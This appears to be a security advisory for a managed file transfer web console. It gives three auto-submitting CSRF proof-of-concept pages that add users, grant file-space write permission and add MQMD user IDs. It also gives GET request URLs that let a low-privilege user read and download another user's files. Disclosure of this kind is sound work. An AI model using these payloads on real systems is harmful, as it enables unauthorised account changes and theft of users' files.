*Exploit Details:*
*1. CSRF To add user and define his quota on a userspace*
I created the following HTML page and then opened it by a logged-on user:
 
<html>
 
                  <head></head>
 
                  <body>
 
                                    <form id="frm" method="post"
action="https://www.example.com /wmqfteconsole/Filespaces"
 
                                                      <input type="hidden"
name="nirvcsrf" value="junk" />
 
                                                      <input type="hidden"
name="name" value="zzzzzz" />
 
                                                      <input type="hidden"
name="quota" value="15" />
 
                                                      <input type="hidden"
name="id" value="NewFileSpace" />
 
 
 
                                    </form>
 
                                    <script>
 
                                                      document.frm.submit();
 
                                    </script>
 
                  </body>
</html>
See the following screenshot, which follows the execution of CSRF attack:
[image: Inline image 1]
 
*2. CSRF to add permissions on file spaces:*
I created the following HTML page and then opened it by a logged-on user:
 
<html>
 
                  <head></head>
 
                  <body>
 
                                    <form id="frm" method="post"
action="https://www.example.com
 /wmqfteconsole/FileSpacePermisssions"
 
                                                      <input type="hidden"
name="nirvcsrf" value="junk" />
 
                                                      <input type="hidden"
name="user" value="bodek2" />
 
                                                      <input type="hidden"
name="write" value="authorized" />
 
                                                      <input type="hidden"
name="id" value="zzzzzz_TEMP_PERMISSIONS" />
 
 
 
                                    </form>
 
                                    <script>
 
                                                      document.frm.submit();
 
                                    </script>
 
                  </body>
</html>
 
 
*2. CSRF to add MQMD user id:*
I created the following HTML page and then opened it by a logged-on user:
 
<html>
 
                  <head></head>
 
                  <body>
 
                                    <form id="frm" method="post"
action="https://www.example.com/wmqfteconsole/UploadUsers"
 
                                                      <input type="hidden"
name="nirvcsrf" value="junk" />
 
                                                      <input type="hidden"
name="userID" value="csrfUserId" />
 
                                                      <input type="hidden"
name="mqmdUserID" value="userIdTest" />
 
                                                      <input type="hidden"
name="id" value="NewUploadUser" />
 
 
 
                                    </form>
 
                                    <script>
 
                                                      document.frm.submit();
 
                                    </script>
 
                  </body>

Details:*
*1. Privilege escalation to view other user's files and filespace*
I logged on using user "user2" (non-administrative account
with download\upload files permissions only) and then sent a GET request to
the following URL:
/transfer/?start=0&count=10&metadata=fteSamplesUser=user1
As a result, the response included the data of "user1".
 
*2. Privilege escalation to download user user's files*
In order to execute the attack, the malicious user should know the file
name and the related ID before executing the attack.
In this scenario, The malicious user is "user2" and the attacked user is
"user1".
If "user2" knows the url to file of "user1", then he can access this file,
e.g. "user2" is able to access the following URL using a GET request:
/filespace/user1
/414d512057514d542020202020202020eb3bfc4f2030df02/changedthisfilename.txt

